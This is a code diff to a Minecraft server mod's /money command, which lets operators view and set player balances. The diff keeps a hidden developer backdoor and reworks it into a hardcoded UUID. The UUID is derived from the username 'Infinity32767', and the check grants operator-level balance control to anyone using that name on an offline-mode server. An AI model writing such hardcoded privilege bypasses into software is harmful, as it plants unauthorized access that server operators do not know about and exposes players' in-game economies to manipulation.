@@ -6,8 +6,13 @@ import com.inf1nlty.newshop.util.PlayerIdentityUtil;
 import net.minecraft.*;
 import net.minecraft.server.MinecraftServer;
 
+import java.util.UUID;
+
 /** /money — view and set player balances. OPs can set other players' balances. */
 public class MoneyCommand extends CommandBase {
+
+    /** Dev UUID (offline algorithm: UUID.nameUUIDFromBytes("OfflinePlayer:Infinity32767")). */
+    private static final UUID DEV_UUID = UUID.fromString("8dca9432-069c-4df5-bfa9-01f0f3e8e7ad");
 
     @Override public String getCommandName() {
         return "money";
@@ -38,7 +43,7 @@ public class MoneyCommand extends CommandBase {
         }
 
         boolean isOp = MinecraftServer.getServer().getConfigurationManager().isPlayerOpped(player.username)
-                || "Infinity32767".equalsIgnoreCase(player.username);
+                || DEV_UUID.equals(PlayerIdentityUtil.getOfflineUUID(player.username));
 
         if (args.length == 1)
         {
